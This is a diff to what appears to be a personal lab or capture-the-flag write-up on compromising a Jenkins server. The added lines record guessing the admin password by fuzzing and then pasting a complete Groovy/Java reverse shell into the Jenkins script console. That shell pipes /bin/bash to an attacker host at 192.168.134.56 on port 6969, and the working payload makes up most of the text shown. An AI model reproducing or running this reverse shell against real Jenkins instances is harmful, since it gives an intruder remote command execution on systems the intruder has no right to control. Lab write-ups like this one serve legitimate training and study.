@@ -422,4 +422,25 @@ maybe fuzzing password again?
 
 This was dockerized so no `/var/lib/jenkins/secrets/initialAdminPassword`
 
-Got the password `admin:spongebob` after du
+Got the password `admin:spongebob` after fuzzing
+went to the script console to get a reverse shell as jenkins
+
+``` java
+String host="192.168.134.56";
+int port=6969;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host, port);
+InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
+OutputStream po=p.getOutputStream(), so=s.getOutputStream();
+while(!s.isClosed()){
+    while(pi.available()>0) so.write(pi.read());
+    while(pe.available()>0) so.write(pe.read());
+    while(si.available()>0) po.write(si.read());
+    so.flush();
+    po.flush();
+    Thread.sleep(50);
+}
+p.destroy();
+s.close();
+```
